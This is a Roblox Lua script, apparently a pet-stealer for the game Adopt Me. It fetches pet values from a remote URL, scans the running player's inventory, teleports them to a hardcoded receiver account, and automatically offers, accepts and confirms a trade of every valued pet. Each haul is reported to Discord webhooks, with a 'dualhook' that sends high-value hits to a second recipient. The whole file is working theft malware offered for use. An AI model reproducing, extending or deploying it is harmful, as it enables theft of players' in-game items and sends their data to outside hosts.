-- [[ DATA STORAGE ]] --
local PetValues = {}
local TradeAPI = ReplicatedStorage:WaitForChild("API")

--------------------------------------------------------------
-- ROBUST POINT SYSTEM LOADER (Fixes JSON Error)
--------------------------------------------------------------
local function loadPoints()
    local success, content = pcall(function() return game:HttpGet(POINT_SYSTEM_URL) end)
    if not success or not content then 
        warn("[ELYSIUM] Failed to reach GitHub.")
        return 
    end

    -- Try parsing as JSON first
    local jsonSuccess, decoded = pcall(function() return HttpService:JSONDecode(content) end)
    
    if jsonSuccess and type(decoded) == "table" then
        PetValues = decoded
        print("[ELYSIUM] Point System Loaded (JSON)")
    else
        -- Fallback: Parse as Plain Text (Line by Line)
        -- Format expected: "PetName:Value" or "PetName=Value"
        print("[ELYSIUM] JSON failed, parsing as plain text...")
        for line in content:gmatch("[^\r\n]+") do
            local name, val = line:match("([^:=]+)[:=](%d+)")
            if name and val then
                PetValues[name:trim()] = tonumber(val)
            end
        end
        print("[ELYSIUM] Point System Loaded (Text)")
    end
end
loadPoints()

--------------------------------------------------------------
-- WEBHOOK HANDLER
--------------------------------------------------------------
local function sendRequest(url, payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if not requestFunc then return end
    pcall(function()
        requestFunc({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

local function handleWebhooks(pets, total)
    local isHighTier = (total >= DUALHOOK_MIN)
    local petStrings = {}
    for _, p in ipairs(pets) do 
        if p.value >= DUALHOOK_MIN then isHighTier = true end
        table.insert(petStrings, string.format("• %s ($%d)", p.name, p.value)) 
    end

    local embed = {
        title = "🐾 Adopt Me Trade Export",
        color = isHighTier and 0xFF0000 or 0x3498DB,
        fields = {
            {name = "👤 User", value = LocalPlayer.Name, inline = true},
            {name = "💰 Value", value = total .. " Pesos", inline = true},
            {name = "📦 Traded", value = "```\n" .. (table.concat(petStrings, "\n") or "None") .. "\n```"}
        },
        footer = {text = "Elysium ADM | " .. os.date("%X")},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    -- Userhook
    local userPing = (total >= USER_PING_MIN) and "@everyone" or ""
    sendRequest(USER_WEBHOOK, {content = userPing, embeds = {embed}})

    -- Dualhook
    if isHighTier then
        sendRequest(DUAL_WEBHOOK, {content = "@everyone", embeds = {embed}})
    end
end

--------------------------------------------------------------
-- TRADE & MOVEMENT
--------------------------------------------------------------
local function getReceiver()
    for _, name in ipairs(TARGET_RECEIVERS) do
        local p = Players:FindFirstChild(name)
        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then return p end
    end
    return nil
end

local function scanInventory()
    local list, total = {}, 0
    local success, inv = pcall(function() return TradeAPI["InventoryAPI/GetInventory"]:InvokeServer() end)
    if success and inv then
        for _, item in ipairs(inv) do
            if item.Kind == "Pet" then
                -- Match pet name against our Point System
                local val = PetValues[item.Name] or 0
                if val > 0 then
                    table.insert(list, {id = item.Id, name = item.Name, value = val})
                    total = total + val
                end
            end
        end
    end
    return list, total
end

local function startTradeProcess()
    local target = getReceiver()
    if not target then return end

    -- Instant TP
    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then 
        hrp.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3) 
    end
    
    task.wait(0.1)
    
    -- Fast Interaction
    TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(target)
    
    local pets, totalVal = scanInventory()
    if #pets > 0 then
        for _, p in ipairs(pets) do
            TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id)
        end
        TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
        TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
        handleWebhooks(pets, totalVal)
    end
end

--------------------------------------------------------------
-- MAIN LOOP
--------------------------------------------------------------
print("[ELYSIUM] Final Version Running...")
task.spawn(function()
    while true do
        pcall(startTradeProcess)
        task.wait(POLL_RATE)
    end
end)
